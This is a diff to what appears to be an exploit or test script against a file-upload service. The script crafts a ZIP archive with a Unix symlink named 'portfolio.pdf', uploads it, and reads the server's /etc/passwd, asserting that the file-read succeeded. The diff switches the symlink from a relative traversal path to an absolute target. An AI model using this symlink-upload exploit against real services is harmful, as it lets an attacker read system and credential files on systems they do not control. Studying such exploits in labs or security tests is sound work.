@@ -39,10 +39,7 @@ def archive_with_symlink(target):
         info = zipfile.ZipInfo("portfolio.pdf")
         info.create_system = 3
         info.external_attr = (stat.S_IFLNK | 0o777) << 16
-        # On Debian p7zip, absolute ZIP link destinations are rebased under
-        # the extraction directory. A relative symlink resolves correctly both
-        # in the temporary extraction directory and after publishing.
-        archive.writestr(info, '../../../../..' + target)
+        archive.writestr(info, target)
     return out.getvalue()
 
 def leak(target):
@@ -74,7 +71,7 @@ with zipfile.ZipFile(invalid_data, "w") as archive:
 _, rejected = upload_zip("resume.zip", invalid_data.getvalue())
 assert "must have a .pdf extension" in rejected
 
-print("[4/10] Native 7z extraction of a Unix ZIP symlink")
+print("[4/10] Native Info-ZIP extraction of a Unix ZIP symlink")
 passwd = leak("/etc/passwd")
 assert "root:x:0:0:" in passwd, "Real symbolic-link file-read failed"
 
